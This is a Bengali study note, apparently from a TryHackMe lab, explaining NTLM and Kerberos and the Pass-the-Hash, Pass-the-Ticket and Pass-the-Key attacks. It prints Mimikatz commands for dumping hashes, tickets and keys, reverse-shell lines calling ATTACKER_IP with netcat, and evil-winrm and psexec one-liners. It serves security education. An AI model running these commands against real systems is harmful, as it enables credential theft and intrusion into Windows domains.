# **Use of Alternate Authentication Material**

## **1. Alternate Authentication Material কী?**

**Alternate Authentication Material** হলো এমন data, যা user's actual password না জেনেও Windows account access করতে সাহায্য করে।

Windows authentication protocol-এর কারণে এটি সম্ভব।

এই section-এ দুটি protocol নিয়ে আলোচনা করা হয়েছে:

- NTLM authentication
- Kerberos authentication

**Note:** এখানে ধরে নেওয়া হয়েছে যে host থেকে credentials extract করার tools ও methods সম্পর্কে ধারণা আছে। Credential extraction-এর জন্য **Mimikatz** ব্যবহার করা হবে।

## **2. NTLM Authentication**

### **NTLM কীভাবে কাজ করে?**

1. Client server-এ authentication request পাঠায়।
2. Server একটি random number তৈরি করে client-কে পাঠায়। এটিকে **Challenge** বলে।
3. Client তার NTLM password hash ও challenge ব্যবহার করে response তৈরি করে server-এ পাঠায়।
4. Server challenge ও response Domain Controller-এ verification-এর জন্য পাঠায়।
5. Domain Controller একই challenge ব্যবহার করে response তৈরি করে client-এর response-এর সঙ্গে compare করে।
6. Match হলে authentication success, না হলে access denied। Result server-এর মাধ্যমে client-কে জানানো হয়।

**Note:** Domain account-এর ক্ষেত্রে এই process-এ Domain Controller লাগে। Local account হলে server নিজের SAM-এ থাকা password hash দিয়ে response verify করতে পারে।

## **3. Pass-the-Hash (PtH)**

Host থেকে Mimikatz দিয়ে credentials extract করলে plaintext password বা NTLM hash পাওয়া যেতে পারে।

- Hash crack করা না গেলেও NTLM authentication-এ সেটি ব্যবহার করা যায়।
- কারণ challenge-এর response তৈরি করতে plaintext password নয়, NTLM hash জানাই যথেষ্ট।
- তাই hash crack না করেই authentication সম্ভব। একে **Pass-the-Hash (PtH)** বলে।

NTLM hash extract করার দুটি উপায়:

### **A. Local SAM থেকে Hash Extract**

- শুধু machine-এর local user-এর hash পাওয়া যায়।
- Domain user-এর hash পাওয়া যায় না।

THMJMP2: PowerShell

```
mimikatz # privilege::debug
mimikatz # token::elevate

mimikatz # lsadump::sam   
RID  : 000001f4 (500)
User : Administrator
  Hash NTLM: 145e02c50333951f71d13c245d352b50
```

### **B. LSASS Memory থেকে Hash Extract**

- Local user-এর hash পাওয়া যায়।
- Machine-এ recently login করা Domain user-এর hash-ও পাওয়া যায়।

THMJMP2: PowerShell

```
mimikatz # privilege::debug
mimikatz # token::elevate
```

### **PtH ব্যবহার করে Authentication**

প্রথমে original token restore করতে হবে। Elevated token দিয়ে PtH কাজ করবে না।

```
mimikatz # token::revert
mimikatz # sekurlsa::pth /user:bob.jenkins /domain:za.tryhackme.com /ntlm:6b4a57f67805a663c818106dc0648484 /run:"c:\tools\nc64.exe -e cmd.exe ATTACKER_IP 5555"
```

- `token::revert` → Original token privileges restore করে।
- `sekurlsa::pth` → NTLM hash ব্যবহার করে victim user-এর credentials inject করে।
- এটি `runas /netonly`-এর মতো, তবে password-এর পরিবর্তে hash ব্যবহার করে।
- নতুন reverse shell থেকে victim user-এর credentials দিয়ে command চালানো যাবে।

**AttackBox listener:**

```
user@AttackBox$ nc -lvp 5555
```

**Important:** Reverse shell-এ `whoami` চালালে আগের user-ই দেখাতে পারে। কিন্তু এখান থেকে চালানো command injected credentials ব্যবহার করবে।

### **Linux থেকে Pass-the-Hash**

Linux machine (যেমন AttackBox) থেকেও বিভিন্ন tool দিয়ে PtH করা যায়।

**RDP:**

```
xfreerdp /v:VICTIM_IP /u:DOMAIN\\MyUser /pth:NTLM_HASH
```

**PsExec:**

```
psexec.py -hashes NTLM_HASH DOMAIN/MyUser@VICTIM_IP
```

Note: শুধু Linux version-এর `psexec` PtH support করে।

**WinRM:**

```
evil-winrm -i VICTIM_IP -u MyUser -H NTLM_HASH
```

## **4. Kerberos Authentication**

Kerberos হলো Windows network-এর authentication protocol।

### **Kerberos কীভাবে কাজ করে?**

**Step 1: TGT Request**

- User username ও timestamp পাঠায়।
- Timestamp password থেকে তৈরি encryption key দিয়ে encrypt করা থাকে।
- Request যায় **KDC (Key Distribution Center)**-তে।
- KDC সাধারণত Domain Controller-এ installed থাকে এবং Kerberos ticket তৈরি করে।

<img width="1047" height="416" alt="image" src="https://github.com/user-attachments/assets/2022533a-1706-4096-b9c2-63f058c60b44" />

**Step 2: TGT Receive**

- KDC একটি **TGT (Ticket Granting Ticket)** পাঠায়।
- TGT ব্যবহার করে user বিভিন্ন service-এর ticket চাইতে পারে, প্রতিবার service-কে credentials দিতে হয় না।
- TGT-এর সঙ্গে একটি **Session Key** দেওয়া হয়, যা পরবর্তী request-এ লাগে।
- TGT, `krbtgt` account-এর password hash দিয়ে encrypted থাকে।
- User TGT-এর content দেখতে পারে না।
- Encrypted TGT-এর ভেতরে Session Key-এর copy থাকে। KDC TGT decrypt করে Session Key recover করতে পারে; তাই KDC-কে Session Key আলাদাভাবে store করতে হয় না।

<img width="1049" height="486" alt="image" src="https://github.com/user-attachments/assets/751aa126-fea6-4aba-94c3-4abb7aca8cfb" />

**Step 3: TGS Request**

User যখন network-এর কোনো service যেমন share, website বা database access করতে চায়:

- TGT ব্যবহার করে KDC-এর কাছে **TGS (Ticket Granting Service)** request করে।
- Username ও Session Key দিয়ে encrypted timestamp পাঠায়।
- সঙ্গে TGT ও **SPN (Service Principal Name)** পাঠায়।
- SPN দিয়ে কোন service এবং server access করতে চায় তা বোঝানো হয়।

<img width="1029" height="362" alt="image" src="https://github.com/user-attachments/assets/dfda3712-92d7-4e38-ba35-1c560fe5f267" />

**Step 4: TGS Receive**

- KDC একটি TGS ও Service Session Key পাঠায়।
- TGS, Service Owner-এর hash দিয়ে encrypted থাকে।
- Service Owner হলো যে user বা machine account-এর অধীনে service চলে।
- TGS-এর encrypted content-এর মধ্যে Service Session Key-এর copy থাকে।

**Step 5: Authenticate**

- User TGS-টি desired service-এ পাঠায়।
- Service তার configured account-এর password hash দিয়ে TGS decrypt করে।
- Service Session Key verify করে authentication সম্পন্ন করে।

## **5. Pass-the-Ticket (PtT)**

Mimikatz দিয়ে LSASS memory থেকে Kerberos ticket ও Session Key extract করা যায়।

সাধারণত target machine-এ SYSTEM privilege প্রয়োজন।

**Ticket extract:**

```
mimikatz # privilege::debug
mimikatz # sekurlsa::tickets /export
```

**Important:**

- শুধু ticket থাকলে হবে না, corresponding Session Key-ও লাগবে।
- দুটোই প্রয়োজন।
- Mimikatz LSASS memory থেকে TGT ও TGS extract করতে পারে।
- TGT দিয়ে user যেসব service access করতে পারে, সেগুলোর ticket request করা যায়।
- TGS শুধু নির্দিষ্ট service-এর জন্য ব্যবহার করা যায়।
- TGT extract করতে administrator credentials লাগে।
- TGS extract করতে low-privileged account-ই যথেষ্ট, তবে শুধু ওই account-এর assigned TGS পাওয়া যাবে।

- Inject করা ticket lateral movement tools ব্যবহার করতে পারবে।

## **6. Overpass-the-Hash / Pass-the-Key (PtK)**

এটি PtH-এর মতো, তবে Kerberos authentication-এর জন্য ব্যবহার হয়।

### **কীভাবে কাজ করে?**

- User TGT request করার সময় password থেকে তৈরি encryption key দিয়ে timestamp encrypt করে পাঠায়।
- ব্যবহৃত algorithm হতে পারে:
  - DES (বর্তমান Windows version-এ default disabled)
  - RC4
  - AES128
  - AES256
- এই key-গুলোর যেকোনো একটি থাকলে actual password ছাড়াই KDC থেকে TGT request করা যায়।
- একে **Pass-the-Key (PtK)** বলে।

**Kerberos encryption key extract:**

```
mimikatz # privilege::debug
mimikatz # sekurlsa::ekeys
```

### **RC4 Hash থাকলে**

```
mimikatz # sekurlsa::pth /user:Administrator /domain:za.tryhackme.com /rc4:96ea24eff4dff1fbe13818fbf12ea7d8 /run:"c:\tools\nc64.exe -e cmd.exe ATTACKER_IP 5556"
```

### **AES128 Hash থাকলে**

```
mimikatz # sekurlsa::pth /user:Administrator /domain:za.tryhackme.com /aes128:b65ea8151f13a31d01377f5934bf3883 /run:"c:\tools\nc64.exe -e cmd.exe ATTACKER_IP 5556"
```

### **AES256 Hash থাকলে**

```
mimikatz # sekurlsa::pth /user:Administrator /domain:za.tryhackme.com /aes256:b54259bbff03af8d37a138c375e29254a2ca0649337cc4c73addcd696b4cdb65 /run:"c:\tools\nc64.exe -e cmd.exe ATTACKER_IP 5556"
```

**Overpass-the-Hash (OPtH):**

- RC4 key = User-এর NTLM hash।
- তাই NTLM hash extract করতে পারলে এবং RC4 enabled থাকলে সেটি দিয়ে Kerberos TGT request করা যায়।
- এই বিশেষ PtK technique-কে **Overpass-the-Hash (OPtH)** বলে।

**AttackBox listener:**

```
user@AttackBox$ nc -lvp 5556
```

PtH-এর মতোই, এই shell থেকে চালানো command injected credentials ব্যবহার করবে।

## **Quick Revision**

| Technique                    | কী ব্যবহার করে                | মূল ধারণা                           |
| ---------------------------- | ----------------------------- | ----------------------------------- |
| **Pass-the-Hash (PtH)**      | NTLM hash                     | Password ছাড়াই NTLM authentication  |
| **Pass-the-Ticket (PtT)**    | Kerberos ticket + Session Key | Extracted ticket inject করে access  |
| **Pass-the-Key (PtK)**       | Kerberos encryption key       | Key দিয়ে TGT request                |
| **Overpass-the-Hash (OPtH)** | NTLM hash as RC4 key          | NTLM hash দিয়ে Kerberos TGT request |

**গুরুত্বপূর্ণ পার্থক্য:**

- SAM → শুধু local user hash।
- LSASS → Local user ও recently logged-in domain user hash।
- TGT → একাধিক service-এর ticket request করতে পারে।
- TGS → নির্দিষ্ট service-এর জন্য।
- PtH → NTLM authentication।
- PtT → Kerberos ticket ব্যবহার।
- PtK → Kerberos encryption key ব্যবহার।
